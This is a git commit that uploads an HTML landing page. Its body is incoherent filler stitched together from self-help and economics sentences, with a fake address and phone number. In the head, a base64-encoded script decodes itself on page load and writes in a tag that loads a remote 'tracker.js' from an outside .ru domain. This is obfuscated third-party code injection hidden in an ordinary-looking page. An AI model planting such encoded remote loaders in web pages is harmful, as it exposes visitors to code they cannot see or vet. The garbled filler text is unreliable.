16eb7b8f08786a460b4e07d5135addf42a23c559
tblsriag <78555143+tblsriag@users.noreply.github.com>
2021-02-04 18:34:04 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>- No, I did! I clearly said ...  The first is the successful developmen</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8wdm5yZnJoZzBib3k3bjgyeTEiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="4ffb8xr7hx1bfcll">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="3y5bmcuv8idqrzg69ox5p3r">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>- No, I did! I clearly said ...  The first is the successful developmen</h1>
+	</section>
+
+
+	<section class="our-work" class="s1lrwlx1w165z5axdi">
+		<h3 class="title">Nobody controlled him.  Attempts are often made to </h3>
+		<p>It took them three days to complete this work.  - Sure! After all, without a degree, you won't get a good job or go to college.  Finally, in the middle of our conversation, he got up, went to the phone and dialed his wife's number.  We are rarely interested in their accuracy.  This means that the connection that exists between the parts of a whole is itself a part of this whole.  But if we start with a Personal Daily Victory and work from the inside out, the results are bound to appear.  And the more we learn about correct principles, the wider our personal freedom to act rationally becomes.  With a time-based wage system, the size of the wage depends on the actual hours worked and the employee's wage rate, and not on the number of work performed.  Arriving quite late, I checked in and asked if I could contact the service now to order dinner in my room.  Arguing in this way, they may eventually come to some kind of compromise.  Separation (segregation) of risks is carried out by separating assets.  Let you say that you love and appreciate me.  In addition, they need approval for their actions. </p>
+		<hr>
+
+		<ul class="grid" class="f3wngy8y0xx9npdslx">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="4ffb8xr7hx1bfcll">
+		<h3 class="title">However, choices, as opposed to desires, a</h3>
+		<p>The first wave or first generation of time management can be characterized by notes and memos, an attempt to somehow organize and organize everything that requires us to invest time and effort.The second generation can be characterized by the advent of calendars and business diaries.  Your presentation should focus on the need to always have a clearly articulated goal for each meeting and a well-thought-out agenda on which each meeting participant can make suggestions.  Or else I should find some kind of motivating training program that gets them to work harder.  In the presence of new expectations, the old deposits disappear.  Instead of full and natural mutual understanding and communication, adaptation develops when two people simply try to live independent lives, observing external respect and mutual tolerance.  His inner self remained invulnerable.  The heart has its own understanding, not accessible to the mind.Pascal Principles of Empathic Communication Suppose you have vision problems and decide to go to an optometrist for help. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="3y5bmcuv8idqrzg69ox5p3r" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="s1lrwlx1w165z5axdi">
+		<h3 class="title">They don't go out of their way to get us.They do not offer us q</h3>
+		<p>So, the spouses unite their desires.  Establish standards, performance criteria that will be used in evaluating results,and stipulate specific deadlines for reports and evaluations.  Part-time people are referred to as “unable to find a job”.  You need to be efficient with people, and productive with things.  The first type refers to the conditions for the purchase of a product or payment for a service by an individual consumer, depending on the amount of simultaneously purchased goods.  After that, clearly and logically argue your request.  Exercise is a Quadrant II activity, a higher order activity that most of us do not do because it is not urgent.And since we do not fulfill them, sooner or later we find ourselves in Quadrant I, forced to struggle with health problems and crisis situations that are a natural result of our neglect of physical activities.  But we have very good plans to improve management, reduce costs and increase our market share.  This principle seems fair and rational.  As a result, they may begin to realize that with your secretary they can solve problems more successfully than with you, and provide you with the opportunity to lead - the affairs of Quadrant II.  But since the state considered it necessary to actively participate in the organization of economic life in the country, the function acquired a regulatory property, which is carried out through the tax mechanism. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="f3wngy8y0xx9npdslx" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="4ffb8xr7hx1bfcll">
+		<h3 class="title">We discussed one of the important options for such </h3>
+		<p>This is the same principle that applies to emotional muscles such as patience.  Usually we would drive to a deserted shore, park the Honda, and then walk another two hundred yards to a secluded spot where we were having a picnic in the middle of nature.  Therefore, answer clearly "yes" or "no".  Can you imagine someone in the company saying, “Demand research is bullshit!Let's create new products! " In other words, forget about studying the psychology and motives of customers and just create new types of goods.  Achieving this balance between courage and sensitivity is the essence of true maturity and the foundation of Win / Win.  Once one oriental Zen Buddhist mentor, who always, regardless of any adversity, was distinguished by great calmness and serenity, was asked how he managed to maintain himself in this state.  DEMAND AND COST INFLATION Demand inflation is a phenomenon of imbalance between demand and supply in the direction of demand.  ESSENCE AND CAUSES OF COMMODITY PRODUCTION Commodity production is a form of social production in which products are made for exchange.  Only these sacrifices weren't worth it!(You just don't understand anything!) - Look, maybe if you could study more at home and sit less at the TV ...  We saw in him endless layers of possibilities that had to be realized in accordance with his own life rhythm. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="3y5bmcuv8idqrzg69ox5p3r" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="s1lrwlx1w165z5axdi">
+		<h3 class="title">At given prices for resources, production </h3>
+		<p>Once the problem is identified, research objectives can be formulated.  Dubenetsky, Chairman of the Board of Promstroybank of Russia Stephen Covey's Seven Skills is a textbook for those who want to be effective.  express them in the same monetary units.  We aligned the needs and goals of the leaders with the needs and goals of the salespeople, and the need for training in human relations skills was immediately eliminated. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="f3wngy8y0xx9npdslx" class="title">I need some colored markers.He turned around as he walked and p</h3>	
+		<p>Initiative is also required in mastering the Seven Skills.  - Do you mean to say that you have developed a separate Mission for your hotel? - Exactly.  Power: You are limited by what you can achieve with your money and your one-sided perception of life.  I am not responsible forwhat happens, I am not able to choose my reaction.  In the pages of his autobiography, Sadat admits that he almost left his cell with regret, since it was in it that he learned that real success is success in a relationship with oneself.  This sensation comes from the realization that you are capable of deeply, trulyI can understand the other person that you can move away from your point of view for this without giving up on it.  Schedule a time to get completely out of your business and start working on your Personal Mission Statement. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="4ffb8xr7hx1bfcll">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="3y5bmcuv8idqrzg69ox5p3r"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="s1lrwlx1w165z5axdi"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="f3wngy8y0xx9npdslx"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>613 Oral Forest, Suite 188, 62936, South Macborough, Wyoming, United States</p>
+		<p>Phone number: +59(80)122-20621</p>
+	</footer>
+
+</body>
+
+</html>
